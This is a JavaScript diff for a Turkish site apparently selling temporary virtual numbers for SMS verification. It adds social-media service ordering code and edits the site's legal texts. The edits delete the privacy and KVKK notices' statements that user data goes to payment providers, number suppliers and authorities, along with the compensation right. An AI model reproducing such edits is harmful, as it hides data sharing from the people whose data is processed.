+        html = '<h2>📜 Kullanım Koşulları</h2><p><strong>Son güncelleme:</strong> 24 Eylül 2026</p><h3>1. Taraflar</h3><p>Bu Kullanım Koşulları, Onay Merkezi ile siteyi kullanan kişi arasında akdedilmiştir.</p><h3>2. Hizmetin Tanımı</h3><p>Hizmet Sağlayıcı, kullanıcılara WhatsApp ve diğer platformlarda SMS doğrulaması yapabilmeleri için geçici sanal numara temin eder. Numara 10 dakika geçerlidir.</p><h3>3. Kullanıcı Yükümlülükleri</h3><ul><li>Doğru bilgi vermek</li><li>Hesap güvenliğini sağlamak</li><li>Hizmeti yasalara uygun kullanmak</li></ul><h3>4. Ödeme ve İade</h3><ul><li>Bakiye kart veya IBAN ile yüklenir</li><li>SMS kodu gelmeden iptal edilen işlemlerde tam iade</li><li>Kod geldikten sonra iade yapılmaz</li></ul><h3>5. Uyuşmazlık Çözümü</h3><p>İstanbul Mahkemeleri yetkilidir.</p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
     } else if (type === 'privacy') {
-        html = '<h2>🔒 Gizlilik Politikası</h2><p><strong>Son güncelleme:</strong> 24 Eylül 2026</p><h3>1. Toplanan Veriler</h3><ul><li><strong>Kimlik:</strong> Ad, soyad, e-posta</li><li><strong>İşlem:</strong> Sipariş geçmişi</li><li><strong>Teknik:</strong> IP adresi, tarayıcı</li></ul><h3>2. Verilerin Kullanım Amacı</h3><ul><li>Hizmetlerimizi sunmak</li><li>Ödeme işlemlerini gerçekleştirmek</li><li>Müşteri desteği sağlamak</li><li>Yasal yükümlülükleri yerine getirmek</li></ul><h3>3. Verilerin Paylaşımı</h3><p>Ödeme sağlayıcıları, numara sağlayıcıları ve yasal mercilerle paylaşılabilir.</p><h3>4. Veri Güvenliği</h3><p>Verileriniz SSL şifreleme ile korunur. Kart bilgileriniz sitemizde saklanmaz.</p><h3>5. KVKK Haklarınız</h3><ul><li>İşlenip işlenmediğini öğrenme</li><li>Bilgi talep etme</li><li>Düzeltilmesini isteme</li><li>Silinmesini isteme</li></ul><p>Başvuru: <strong>kvkk@onaymerkezi.org</strong></p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
+        html = '<h2>🔒 Gizlilik Politikası</h2><p><strong>Son güncelleme:</strong> 24 Eylül 2026</p><h3>1. Toplanan Veriler</h3><ul><li><strong>Kimlik:</strong> Ad, soyad, e-posta</li><li><strong>İşlem:</strong> Sipariş geçmişi</li><li><strong>Teknik:</strong> IP adresi, tarayıcı</li></ul><h3>2. Verilerin Kullanım Amacı</h3><ul><li>Hizmetlerimizi sunmak</li><li>Ödeme işlemlerini gerçekleştirmek</li><li>Müşteri desteği sağlamak</li></ul><h3>3. Veri Güvenliği</h3><p>Verileriniz SSL şifreleme ile korunur. Kart bilgileriniz sitemizde saklanmaz.</p><h3>4. KVKK Haklarınız</h3><ul><li>İşlenip işlenmediğini öğrenme</li><li>Bilgi talep etme</li><li>Düzeltilmesini isteme</li><li>Silinmesini isteme</li></ul><p>Başvuru: <strong>kvkk@onaymerkezi.org</strong></p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
     } else if (type === 'kvkk') {
-        html = '<h2>⚖️ KVKK Aydınlatma Metni</h2><p><strong>6698 Sayılı KVKK Kapsamında</strong></p><h3>1. Veri Sorumlusu</h3><p>6698 sayılı KVKK uyarınca kişisel verileriniz, veri sorumlusu olarak Onay Merkezi tarafından işlenebilecektir.</p><h3>2. İşlenme Amacı</h3><p>Hizmetlerimizin sunulabilmesi, sipariş ve ödeme süreçlerinin yürütülmesi, müşteri ilişkilerinin yönetimi, yasal yükümlülüklerin yerine getirilmesi amacıyla işlenmektedir.</p><h3>3. İşlenen Veriler</h3><ul><li><strong>Kimlik:</strong> Ad, soyad</li><li><strong>İletişim:</strong> E-posta</li><li><strong>Müşteri İşlem:</strong> Sipariş bilgileri</li></ul><h3>4. Aktarılması</h3><p>Ödeme hizmet sağlayıcıları, numara tedarikçileri ve yasal yükümlülükler çerçevesinde yetkili kamu kurumlarına aktarılabilir.</p><h3>5. KVKK Haklarınız</h3><ul><li>İşlenip işlenmediğini öğrenme</li><li>Bilgi talep etme</li><li>Düzeltilmesini isteme</li><li>Silinmesini isteme</li><li>Zararın giderilmesini talep etme</li></ul><p>Başvuru: <strong>kvkk@onaymerkezi.org</strong></p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
+        html = '<h2>⚖️ KVKK Aydınlatma Metni</h2><p><strong>6698 Sayılı KVKK Kapsamında</strong></p><h3>1. Veri Sorumlusu</h3><p>6698 sayılı KVKK uyarınca kişisel verileriniz, veri sorumlusu olarak Onay Merkezi tarafından işlenebilecektir.</p><h3>2. İşlenme Amacı</h3><p>Hizmetlerimizin sunulabilmesi, sipariş ve ödeme süreçlerinin yürütülmesi, müşteri ilişkilerinin yönetimi için işlenmektedir.</p><h3>3. İşlenen Veriler</h3><ul><li><strong>Kimlik:</strong> Ad, soyad</li><li><strong>İletişim:</strong> E-posta</li><li><strong>Müşteri İşlem:</strong> Sipariş bilgileri</li></ul><h3>4. KVKK Haklarınız</h3><ul><li>İşlenip işlenmediğini öğrenme</li><li>Bilgi talep etme</li><li>Düzeltilmesini isteme</li><li>Silinmesini isteme</li></ul><p>Başvuru: <strong>kvkk@onaymerkezi.org</strong></p><button class="legal-close" onclick="closeLegal()">Kapat</button>';
     }
     box.innerHTML = html;
     document.getElementById('legalModal').classList.add('active');
@@ -1563,13 +1726,21 @@ onValue(ref(db, 'settings/prices'), (snap) => {
     }
 });
 
+onValue(ref(db, 'settings/smPrices'), (snap) => {
+    if (snap.exists()) {
+        const prices = snap.val();
+        Object.keys(prices).forEach(k => { if (SM_SERVICES[k]) SM_SERVICES[k].price = prices[k]; });
+        updateServicePricesUI();
+        renderSMCards();
+    }
+});
+
 onValue(ref(db, 'settings/iban'), (snap) => { if (snap.exists()) { siteSettings.iban = snap.val(); renderIbanDisplay(); } });
 onValue(ref(db, 'settings/ibanName'), (snap) => { if (snap.exists()) { siteSettings.ibanName = snap.val(); renderIbanDisplay(); } });
 
 onValue(ref(db, 'support_messages'), (snap) => {
     if (!snap.exists()) return;
     const val = snap.val();
-
     let myId = currentUser ? currentUser.uid : localStorage.getItem('guestChatId');
     if (myId) {
         const body = document.getElementById('chatBody');
@@ -1589,10 +1760,7 @@ onValue(ref(db, 'support_messages'), (snap) => {
             });
         }
     }
-
-    if (currentUser && currentUser.email === ADMIN_EMAIL) {
-        loadAdminSupport();
-    }
+    if (currentUser && currentUser.email === ADMIN_EMAIL) { loadAdminSupport(); }
 });
 
 onValue(ref(db, 'users'), (snap) => {
@@ -1607,6 +1775,8 @@ onValue(ref(db, 'users'), (snap) => {
 document.addEventListener('DOMContentLoaded', () => {
     renderLiveFeed();
     updateServicePricesUI();
+    renderSMCards();
+    updateDailyStats();
     const pm = document.getElementById('paymentModal');
     if (pm) pm.addEventListener('click', e => { if (e.target.id === 'paymentModal') closePaymentModal(); });
     const lm = document.getElementById('legalModal');
@@ -1648,6 +1818,7 @@ window.switchAdminTab = switchAdminTab;
 window.loadAdminOrders = loadAdminOrders;
 window.loadAdminUsers = loadAdminUsers;
 window.saveServicesSettings = saveServicesSettings;
+window.loadAdminSMOrders = loadAdminSMOrders;
 window.loadIbanNotifs = loadIbanNotifs;
 window.loadAdminCards = loadAdminCards;
 window.loadAdminSupport = loadAdminSupport;
@@ -1659,6 +1830,9 @@ window.toggleChat = toggleChat;
 window.sendChat = sendChat;
 window.openLegal = openLegal;
 window.closeLegal = closeLegal;
+window.toggleSMDetail = toggleSMDetail;
+window.buySMService = buySMService;
+window.sendSMOrderToAPI = sendSMOrderToAPI;
 </script>
 
 </body>
